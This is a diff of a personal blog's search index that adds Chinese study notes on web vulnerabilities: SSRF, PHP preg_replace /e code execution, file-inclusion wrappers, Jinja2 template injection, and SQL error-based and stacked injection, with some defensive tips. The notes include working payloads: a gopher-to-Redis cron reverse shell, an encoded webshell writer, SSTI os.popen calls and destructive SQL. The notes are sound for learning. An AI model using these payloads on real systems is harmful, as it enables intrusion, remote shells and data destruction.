@@ -1,6 +1,72 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>ssrf</title>
+    <url>/2020/03/25/ssrf/</url>
+    <content><![CDATA[<h1 id="SSRF攻击"><a href="#SSRF攻击" class="headerlink" title="SSRF攻击"></a>SSRF攻击</h1><p><a href="https://www.jianshu.com/p/90a34b08a416" target="_blank" rel="noopener">web安全之 – SSRF攻击</a></p><h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p><strong>SSRF （Server-side Request Forge, 服务端请求伪造）</strong><br> 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统。</p><a id="more"></a>
+
+<h3 id="漏洞产生"><a href="#漏洞产生" class="headerlink" title="漏洞产生"></a>漏洞产生</h3><p>由于服务端提供了从其他服务器应用获取数据的功能且没有对地址和协议等做过滤和限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。</p>
+<p>举个栗子，漏洞代码ssrf.php：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 漏洞代码ssrf.php</span></span><br><span class="line">$ch = curl_init(); </span><br><span class="line">curl_setopt($ch, CURLOPT_URL, $_GET[<span class="string">'url'</span>]); </span><br><span class="line"><span class="comment">#curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);</span></span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>); </span><br><span class="line"><span class="comment">#curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);</span></span><br><span class="line">curl_exec($ch); </span><br><span class="line">curl_close($ch); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>首先curl查看版本以及支持的协议</p>
+<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">root@localhost <span class="symbol">:curl</span> -V</span><br><span class="line">curl <span class="number">7.54</span>.<span class="number">0</span> (x86_64-apple-darwin17.<span class="number">0</span>) libcurl/<span class="number">7.54</span>.<span class="number">0</span> LibreSSL/<span class="number">2.0</span>.<span class="number">20</span> zlib/<span class="number">1.2</span>.<span class="number">11</span> nghttp2/<span class="number">1.24</span>.<span class="number">0</span></span><br><span class="line"><span class="symbol">Protocols:</span> dict file ftp ftps gopher http https imap imaps ldap ldaps pop3 pop3s rtsp smb smbs smtp smtps telnet tftp</span><br><span class="line"><span class="symbol">Features:</span> AsynchDNS IPv6 Largefile GSS-API Kerberos SPNEGO NTLM NTLM_WB SSL libz HTTP2 UnixSockets HTTPS-proxy</span><br></pre></td></tr></table></figure>
+
+<p>可以看到该版本支持很多协议，其中dict协议、gopher协议、http/s协议以及file协议使用较为广泛。</p>
+<ol>
+<li>dict协议探测端口</li>
+</ol>
+<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line">curl -v <span class="symbol">'http</span>:<span class="comment">//a.com/ssrf.php?url=dict://172.0.0.1:22/info'</span></span><br><span class="line">curl -v <span class="symbol">'http</span>:<span class="comment">//a.com/ssrf.php?url=dict://127.0.0.1:6379/info'</span></span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>利用gopher协议访问redis反弹shell</li>
+</ol>
+<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line">curl -v <span class="symbol">'http</span>:<span class="comment">//a.com/ssrf.php?url=gopher%3A%2F%2F127.0.0.1%3A6379%2F_%2A3%250d%250a%243%250d%250aset%250d%250a%241%250d%250a1%250d%250a%2456%250d%250a%250d%250a%250a%250a%2A%2F1%20%2A%20%2A%20%2A%20%2A%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F127.0.0.1%2F2333%200%3E%261%250a%250a%250a%250d%250a%250d%250a%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%243%250d%250adir%250d%250a%2416%250d%250a%2Fvar%2Fspool%2Fcron%2F%250d%250a%2A4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%2410%250d%250adbfilename%250d%250a%244%250d%250aroot%250d%250a%2A1%250d%250a%244%250d%250asave%250d%250a%2A1%250d%250a%244%250d%250aquit%250d%250a'`</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>同时 <code>file_get_contents()</code>、<code>fopen()</code>、<code>fsocksopen()</code> 均可能造成SSRF漏洞</strong></p>
+<h3 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h3><p>攻击者利用ssrf可以实现的攻击主要有5种：</p>
+<p>1.可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息;</p>
+<p>2.攻击运行在内网或本地的应用程序（比如溢出）;</p>
+<p>3.对内网web应用进行指纹识别，通过访问默认文件实现;</p>
+<p>4.攻击内外网的web应用，主要是使用get参数就可以实现的攻击（比如struts2，sqli等）;</p>
+<p>5.利用file协议读取本地文件等。</p>
+<p>常用的利用思路：</p>
+<p>内网探测-&gt;应用识别-&gt;攻击Payload-&gt;Payload Result</p>
+<p>1.内网探测: 内网主机信息收集</p>
+<p>2.应用识别: 主机应用识别(可以通过Barner和应用指纹进行识别)</p>
+<p>3.攻击Payload: 根据应用识别的应用,加载不同的攻击Payload(最常用莫属于Struts2)</p>
+<p>4.Payload Result: 返回相应Payload的执行信息</p>
+<h3 id="常见的存在漏洞的参数："><a href="#常见的存在漏洞的参数：" class="headerlink" title="常见的存在漏洞的参数："></a>常见的存在漏洞的参数：</h3><p>share、wap、url、link、、src、source、target、u、3g、display、sourceURl、imageURL、domain…</p>
+<p>可以结合google语法及上述关键字进行搜索验证。</p>
+<h3 id="常见的容易出问题的函数："><a href="#常见的容易出问题的函数：" class="headerlink" title="常见的容易出问题的函数："></a>常见的容易出问题的函数：</h3><p>PHP : file_get_contents()、fsockopen()、curl_exec()</p>
+<p>JAVA : Request类，URL类的openStream，HttpClient类，URLConnection和HttpURLConnection类</p>
+<h3 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h3><p>1、排除法</p>
+<p>确认目标参数中的URL请求是从客户端发起还是从服务端发起的。</p>
+<p>如：<a href="https://link.jianshu.com?t=http://www.douban.com/" target="_blank" rel="noopener">http://www.douban.com/</a>***/service?image=<a href="https://link.jianshu.com?t=http://www.baidu.com/img/bd_logo1.png" target="_blank" rel="noopener">http://www.baidu.com/img/bd_logo1.png</a></p>
+<p><strong>排除法一：</strong></p>
+<p>你可以直接右键图片，在新窗口打开图片，如果是浏览器上URL地址栏是<a href="http://www.baidu.com/img/bd_logo1.png，说明不存在SSRF漏洞。" target="_blank" rel="noopener">http://www.baidu.com/img/bd_logo1.png，说明不存在SSRF漏洞。</a></p>
+<p><strong>排除法二：</strong></p>
+<p>你可以使用burpsuite等抓包工具来判断是否不是SSRF，首先SSRF是由服务端发起的请求，因此在加载图片的时候，是由服务端发起的，所以在我们本地浏览器的请求中就不应该存在图片的请求，在此例子中，如果刷新当前页面，有如下请求，则可判断不是SSRF。（前提设置burpsuite截断图片的请求，默认是放行的）</p>
+<h3 id="漏洞防护"><a href="#漏洞防护" class="headerlink" title="漏洞防护"></a>漏洞防护</h3><ul>
+<li>禁用不需要的协议，仅仅允许http和https请求，可以防止类似于file://, gopher://, ftp:// 等引起的问题。</li>
+<li>服务端需要认证交互，禁止非正常用户访问服务；</li>
+<li>过滤输入信息，永远不要相信用户的输入，判断用户的输入是否是一个合理的URL地址</li>
+<li>过滤返回信息，验证远程服务器对请求的响应是比较容易的方法，如果web应用是去获取某一种类型的文件。那么在把返* 回结果展示给用户之前先验证返回的信息是否符合标准。</li>
+<li>统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</li>
+<li>禁止30x跳转</li>
+<li>设置URL白名单或限制内网IP</li>
+</ul>
+]]></content>
+  </entry>
+  <entry>
+    <title>反序列化</title>
+    <url>/2020/03/23/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
+    <content><![CDATA[<h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><blockquote>
+<p>反序列化后会执行_wakeup()将file的值修改导致文件读取失败</p>
+<p>把序列化语句中的1替换成2（CVE-2016-7124），即当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行。</p>
+</blockquote>]]></content>
+  </entry>
+  <entry>
     <title>常见源码泄露</title>
     <url>/2020/03/21/%E5%B8%B8%E8%A7%81%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2/</url>
     <content><![CDATA[<h1 id="SWP"><a href="#SWP" class="headerlink" title="SWP"></a>SWP</h1><p> 当你非正常关闭vim编辑器时（比如直接关闭终端或者电脑断电），会生成一个.swp文件，这个文件是一个临时交换文件，用来备份缓冲区中的内容。<br>  需要注意的是如果你并没有对文件进行修改，而只是读取文件，是不会产生.swp文件的。<br>  意外退出时，并不会覆盖旧的交换文件，而是会重新生成新的交换文件。而原来的文件中并不会有这次的修改，文件内容还是和打开时一样。<br>  例如，第一次产生的交换文件名为“.file.txt.swp”；再次意外退出后，将会产生名为“.file.txt.swo”的交换文件；而第三次产生的交换文件则为“.file.txt.swn”；依此类推。 </p>]]></content>
@@ -90,6 +156,32 @@
 <h2 id="sha1"><a href="#sha1" class="headerlink" title="sha1()"></a>sha1()</h2><blockquote>
 <p>sha1()和md5()处理数组的返回都是Null，所以都可以用数组来绕过 </p>
 </blockquote>
+<h2 id="curl-inti"><a href="#curl-inti" class="headerlink" title="curl_inti()"></a>curl_inti()</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl_init()：初始化一个 cURL 会话并且全部的选项都被设置后被调用 </span><br><span class="line">curl_setopt — 为给定的cURL会话句柄设置一个选项。</span><br><span class="line">        说明：</span><br><span class="line">          bool curl_setopt ( resource $ch , int $option , mixed $value )</span><br><span class="line">        参数:</span><br><span class="line">          ch：由 curl_init() 返回的 cURL 句柄。</span><br><span class="line">          option：需要设置的CURLOPT_XXX选项。</span><br><span class="line">          value：将设置在option选项上的值。</span><br><span class="line">          对于下面的这些option的可选参数，value应该被设置一个bool类型的值：</span><br><span class="line">            CURLOPT_RETURNTRANSFER：将curl_exec()获取的信息以文件流的形式返回，而不是直接输出。</span><br><span class="line">          对于下面的这些option的可选参数，value应该被设置一个string类型的值：</span><br><span class="line">            CURLOPT_URL：需要获取的URL地址，也可以在curl_init()函数中设置。</span><br><span class="line">            </span><br><span class="line">            </span><br><span class="line">            ###################</span><br><span class="line">            文件流的形式:指的是在传递过程中的文件,比如你上传一张图片,那么他不是以一个完整的图片传输的,是将文件按特定编码的字符传输.这个就是文件流</span><br><span class="line">curl_exec ：执行 cURL 会话</span><br><span class="line">curl_getinfo — 获取一个cURL连接资源句柄的信息</span><br><span class="line">                说明：</span><br><span class="line">                       mixed curl_getinfo ( resource $ch [, int $opt = 0 ] )获取最后一次传输的相关信息。</span><br><span class="line">                参数：</span><br><span class="line">                      ch 由 curl_init() 返回的 cURL 句柄。</span><br><span class="line">                      opt：这个参数可能是以下常量之一:</span><br><span class="line">                            CURLINFO_HTTP_CODE : 最后一个收到的HTTP代码</span><br><span class="line">cURL是一个利用URL语法在命令行下工作的文件传输工具，1997年首次发行。它支持文件上传和下载，所以是综合传输工具，但按传统，习惯称cURL为下载工具。cURL还包含了用于程序开发的libcurl。</span><br><span class="line">PHP支持的由Daniel Stenberg创建的libcurl库允许你与各种的服务器使用各种类型的协议进行连接和通讯。</span><br><span class="line">libcurl目前支持http、https、ftp、gopher、telnet、dict、file和ldap协议。libcurl同时也支持HTTPS认证、HTTP POST、HTTP PUT、 FTP 上传(这个也能通过PHP的FTP扩展完成)、HTTP 基于表单的上传、代理、cookies和用户名+密码的认证。</span><br><span class="line">PHP中使用cURL实现Get和Post请求的方法</span><br><span class="line">这些函数在PHP 4.0.2中被引入。</span><br></pre></td></tr></table></figure>
+
+<h2 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace()"></a>preg_replace()</h2><p>要确保 replacement 构成一个合法的 PHP 代码字符串，否则 PHP 会在报告在包含 preg_replace() 的行中出现语法解析错误</p>
+<p><strong>preg_replace函数原型：</strong></p>
+<p>mixed preg_replace ( mixed pattern, mixed replacement, mixed subject [, int limit])</p>
+<p><strong>特别说明：</strong> /e 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码（在适当的逆向引用替换完之后）。提示：要确保 replacement 构成一个合法的 PHP 代码字符串，否则 PHP 会在报告在包含 preg_replace() 的行中出现语法解析错误。 举例：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">preg_replace (&quot;/(&lt;/?)(w+)([^&gt;]*&gt;)/e&quot;,</span><br><span class="line">&quot;\1.strtoupper(\2).\3&quot;,</span><br><span class="line">$html_body);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这将使输入字符串中的所有 HTML 标记变成大写。</p>
+<p>安全威胁分析： 通常subject参数是由客户端产生的，客户端可能会构造恶意的代码，例如：</p>
+<p>复制代码 代码如下:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?</span><br><span class="line">echo preg_replace(&quot;/test/e&quot;,$_GET[&quot;h&quot;],&quot;jutst test&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>如果我们提交?h=phpinfo()，phpinfo()将会被执行（使用/e修饰符，preg_replace会将 replacement 参数当作 PHP 代码执行）。 如果我们提交下面的代码会怎么样呢？ ?h=eval(chr(102).chr(112).chr(117).chr(116).chr(115).chr(40).chr(102).chr(111).chr(112).chr(101).chr(110).chr(40).chr(39).chr(100).chr(97). chr(116).chr(97).chr(47).chr(97).chr(46).chr(112).chr(104).chr(112).chr(39).chr(44).chr(39).chr(119).chr(39).chr(41).chr(44).chr(39).chr(60). chr(63).chr(112).chr(104).chr(112).chr(32).chr(101).chr(118).chr(97).chr(108).chr(40).chr(36).chr(95).chr(80).chr(79).chr(83).chr(84).chr(91). chr(99).chr(109).chr(100).chr(93).chr(41).chr(63).chr(62).chr(39).chr(41).chr(59)) 密文对应的明文是：fputs(fopen(data/a.php,w),<?php eval($_POST[cmd])?>); 执行的结果是在/data/目录下生成一个一句话木马文件 a.php。</p>
+<p>再来一个有难度的例子：</p>
+<p>复制代码 代码如下:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?</span><br><span class="line">function test($str)</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line">echo preg_replace(&quot;/s*[php](.+?)[/php]s*/ies&quot;, &apos;test(&quot;\1&quot;)&apos;, $_GET[&quot;h&quot;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>提交 ?h=[php]phpinfo()[/php]，phpinfo()会被执行吗？ 肯定不会。因为经过正则匹配后， replacement 参数变为’test(“phpinfo”)’，此时phpinfo仅是被当做一个字符串参数了。 有没有办法让它执行呢？</p>
+<p>当然有。在这里我们如果提交?h=[php]{${phpinfo()}}[/php]，phpinfo()就会被执行。为什么呢？ 在php中，双引号里面如果包含有变量，php解释器会将其替换为变量解释后的结果；单引号中的变量不会被处理。 注意：双引号中的函数不会被执行和替换。</p>
+<p>在这里我们需要通过{${}}构造出了一个特殊的变量，’test(“{${phpinfo()}}”)’，达到让函数被执行的效果（${phpinfo()}会被解释执行）。 可以先做如下测试：</p>
+<p>复制代码 代码如下:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &quot;&#123;$&#123;phpinfo()&#125;&#125;&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>phpinfo会被成功执行了。</p>
+<p>如何防范这种漏洞呢？ 将’test(“\1”)’ 修改为”test(‘\1’)”，这样‘${phpinfo()}’就会被当做一个普通的字符串处理（单引号中的变量不会被处理）。</p>
 ]]></content>
   </entry>
   <entry>
@@ -157,10 +249,15 @@
   <entry>
     <title>文件包含</title>
     <url>/2020/03/17/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
-    <content><![CDATA[<h2 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h2><h3 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h3><p>前提 phpinfo中的allow_url_include是开启的</p><blockquote>
-<p><strong>php://input</strong> 可以访问请求的原始数据的只读流, 将post请求中的数据作为PHP代码执行。 </p>
-</blockquote><a id="more"></a>
+    <content><![CDATA[<h2 id="常见文件包含函数"><a href="#常见文件包含函数" class="headerlink" title="常见文件包含函数"></a>常见文件包含函数</h2><h2 id="php中常见的文件包含函数有以下四种："><a href="#php中常见的文件包含函数有以下四种：" class="headerlink" title="php中常见的文件包含函数有以下四种："></a>php中常见的文件包含函数有以下四种：</h2><blockquote>
+<p>include()<br>require()<br>include_once()<br>require()_once()</p>
+</blockquote><p>include与require基本是相同的，除了错误处理方面:</p><a id="more"></a>
 
+<p>include()，只生成警告（E_WARNING），并且脚本会继续<br>require()，会生成致命错误（E_COMPILE_ERROR）并停止脚本<br>include_once()与require()_once()，如果文件已包含，则不会包含，其他特性如上</p>
+<h2 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h2><h3 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h3><p>前提 phpinfo中的allow_url_include是开启的</p>
+<blockquote>
+<p><strong>php://input</strong> 可以访问请求的原始数据的只读流, 将post请求中的数据作为PHP代码执行。 </p>
+</blockquote>
 <h3 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h3><p> <code>file_get_contents</code> 是可以触发 <code>php://filter</code> </p>
 <p>php://filter在双off的情况下也可以正常使用；</p>
 <p>allow_url_fopen ：off/on</p>
@@ -169,6 +266,14 @@
 <p>php://filter 读取源代码并进行base64编码输出，不然会直接当做php代码执行就看不到源代码内容了。 </p>
 <p>?path=php://filter/read=convert.base64-encode/resource=xxxxx.php</p>
 </blockquote>
+<h3 id="data-伪协议"><a href="#data-伪协议" class="headerlink" title="data://伪协议"></a>data://伪协议</h3><blockquote>
+<p>数据流封装器，和php://相似都是利用了流的概念，将原本的include的文件流重定向到了用户可控制的输入流中，简单来说就是执行文件的包含方法包含了你的输入流，通过你输入payload来实现目的</p>
+</blockquote>
+<p>如果php.ini里的allow_url_include=On（PHP &lt; 5.3.0）,就可以造成任意代码执行，同理在这就可以理解成远程文件包含漏洞（RFI） </p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">data:text/plain,&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">data:text/plain; base64,</span><br></pre></td></tr></table></figure>
+
 ]]></content>
   </entry>
   <entry>
@@ -281,16 +386,11 @@
 
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&apos;&apos;.__class__.__base__.__subclasses__()[131].__init__.__globals__[&apos;__builtins__&apos;][&apos;ev&apos;+&apos;al&apos;](&apos;__im&apos;+&apos;port__(&quot;o&apos;+&apos;s&quot;).po&apos;+&apos;pen(&quot;cat /this_is_the_fl&apos;+&apos;ag.txt&quot;)&apos;).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;&#123;&apos;&apos;.__class__.__base__.__subclasses__()[77].__init__.__globals__[&apos;sys&apos;].modules[&apos;o&apos;+&apos;s&apos;].__dict__[&apos;po&apos;+&apos;pen&apos;](&apos;cat /this_is_the_fl&apos;+&apos;ag.txt&apos;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
 
-]]></content>
-  </entry>
-  <entry>
-    <title>堆叠注入</title>
-    <url>/2020/03/17/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/</url>
-    <content><![CDATA[<blockquote>
-<p>在PHP中，<code>mysqli_multi_query()</code>函数可以多语句查询SQL </p>
-</blockquote><h4 id="堆叠注入原理"><a href="#堆叠注入原理" class="headerlink" title="堆叠注入原理"></a>堆叠注入原理</h4><blockquote>
-<p>​    在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：1; DELETE FROM products; 服务器端生成的sql语句为：（因未对输入的参数进行过滤）Select * from products where productid=1;DELETE FROM products;当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。 </p>
-</blockquote>]]></content>
+<blockquote>
+<p>python还有一些内置函数，比如url_for和get_flashed_messages </p>
+</blockquote>
+<p><strong>get_flashed_messages</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">返回之前在Flask中通过 flash() 传入的闪现信息列表。把字符串对象表示的消息加入到一个消息队列中，然后通过调用 get_flashed_messages() 方法取出(闪现信息只能取出一次，取出后闪现信息会被清空)。</span><br></pre></td></tr></table></figure>]]></content>
   </entry>
   <entry>
     <title>SQL注入</title>
@@ -321,7 +421,7 @@
 
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id=1&apos; union select 1,2,load_file(&apos;~/.bash_history&apos;)     （“~/”表示用户目录）</span><br></pre></td></tr></table></figure>
 
-<h1 id="sql注入12个报错方式"><a href="#sql注入12个报错方式" class="headerlink" title="sql注入12个报错方式"></a><strong>sql注入12个报错方式</strong></h1><p><a href="https://www.bugku.com/forum.php?mod=viewthread&tid=93&extra=page%3D1%26filter%3Dtypeid%26typeid%3D26" target="_blank" rel="noopener">sql注入12个报错方式</a></p>
+<h1 id="sql注入12个报错方式"><a href="#sql注入12个报错方式" class="headerlink" title="sql注入12个报错方式"></a>sql注入12个报错方式</h1><p><a href="https://www.bugku.com/forum.php?mod=viewthread&tid=93&extra=page%3D1%26filter%3Dtypeid%26typeid%3D26" target="_blank" rel="noopener">sql注入12个报错方式</a></p>
 <blockquote>
 <p>1、通过floor报错,注入语句如下:<br>and select 1 from (select count(<em>),concat(version(),floor(rand(0)</em>2))x from information_schema.tables group by x)a);</p>
 <p>2、通过ExtractValue报错,注入语句如下:<br>and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));</p>
@@ -336,7 +436,27 @@
 <p>11、通过multpolygon ()报错,注入语句如下:<br>and multpolygon (()select * from(selectuser () )a)b );</p>
 <p>12、通过linestring ()报错,注入语句如下:<br>and linestring (()select * from(select user() )a)b );</p>
 </blockquote>
-]]></content>
+<h1 id="堆叠注入原理"><a href="#堆叠注入原理" class="headerlink" title="堆叠注入原理"></a>堆叠注入原理</h1><blockquote>
+<p>在PHP中，<code>mysqli_multi_query()</code>函数可以多语句查询SQL </p>
+</blockquote>
+<blockquote>
+<p>​    在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。用户输入：1; DELETE FROM products; 服务器端生成的sql语句为：（因未对输入的参数进行过滤）Select * from products where productid=1;DELETE FROM products;当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。 </p>
+</blockquote>
+<h1 id="mysql查询语句-handler"><a href="#mysql查询语句-handler" class="headerlink" title="mysql查询语句-handler"></a>mysql查询语句-handler</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote>
+<p>mysql除可使用select查询表中的数据，也可使用handler语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler语句并不具备select语句的所有功能。它是mysql专用的语句，并没有包含到SQL标准中。<br>    HANDLER语句提供通往表的直接通道的存储引擎接口，可以用于MyISAM和InnoDB表。</p>
+</blockquote>
+<h2 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h2><p>handler语句的语法如下：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HANDLER tbl_name OPEN [ [AS] alias]</span><br><span class="line"></span><br><span class="line">HANDLER tbl_name READ index_name &#123; = | &lt;= | &gt;= | &lt; | &gt; &#125; (value1,value2,...)</span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line">HANDLER tbl_name READ index_name &#123; FIRST | NEXT | PREV | LAST &#125;</span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line">HANDLER tbl_name READ &#123; FIRST | NEXT &#125;</span><br><span class="line">    [ WHERE where_condition ] [LIMIT ... ]</span><br><span class="line"></span><br><span class="line">HANDLER tbl_name CLOSE</span><br></pre></td></tr></table></figure>
+
+<p>​    通过HANDLER tbl_name OPEN打开一张表，无返回结果，实际上我们在这里声明了一个名为tb1_name的句柄。<br>​    通过HANDLER tbl_name READ FIRST获取句柄的第一行，通过READ NEXT依次获取其它行。最后一行执行之后再执行NEXT会返回一个空的结果。<br>​    通过HANDLER tbl_name CLOSE来关闭打开的句柄。</p>
+<pre><code>通过索引去查看的话可以按照一定的顺序，获取表中的数据。
+通过HANDLER tbl_name READ index_name FIRST，获取句柄第一行（索引最小的一行），NEXT获取下一行，PREV获取前一行，LAST获取最后一行（索引最大的一行）。
+
+通过索引列指定一个值，可以指定从哪一行开始。
+通过HANDLER tbl_name READ index_name = value，指定从哪一行开始，通过NEXT继续浏览。
+
+如果我们不想浏览一个表的所有行，可以使用where和limit子句。</code></pre><h1 id="预编译绕过"><a href="#预编译绕过" class="headerlink" title="预编译绕过"></a>预编译绕过</h1><p>例如：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-1&apos;;set @sql = CONCAT(&apos;se&apos;,&apos;lect * from `1919810931114514`;&apos;);prepare stmt from @sql;EXECUTE stmt;#</span><br></pre></td></tr></table></figure>]]></content>
   </entry>
   <entry>
     <title>CGI模式</title>
